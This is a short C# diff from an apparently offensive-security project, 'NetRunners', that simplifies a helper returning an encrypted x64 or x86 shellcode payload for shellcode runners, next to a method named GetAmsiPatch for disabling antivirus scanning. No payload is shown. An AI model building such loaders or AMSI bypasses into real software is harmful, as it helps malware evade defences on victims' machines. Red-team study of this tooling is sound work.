@@ -6,18 +6,14 @@ namespace NetRunners.Helpers
 {
     public static class Helper
     {
-        public static (byte[] buf, int sBuf) GetPayloadAndSize()  // for shellcode runners
+        public static byte[] GetPayload()  // for shellcode runners
         {
             // define buf var using bitness
             byte[] buf = (IntPtr.Size == 8) 
                 ? Data.EncryptedData.buf                                // x64 payload
                 : Data.EncryptedData.buf86;                             // x86 payload
-            // define sbuf var using bitness
-            int sBuf = (IntPtr.Size == 8)
-                ? Data.EncryptedData.sBuf                               // x64 payload
-                : Data.EncryptedData.sBuf86;                              // x86 payload
 
-            return (buf, sBuf);                                         // returns tuple with buf and sBuf
+            return buf;
         }
         public static byte[] GetAmsiPatch()
         {
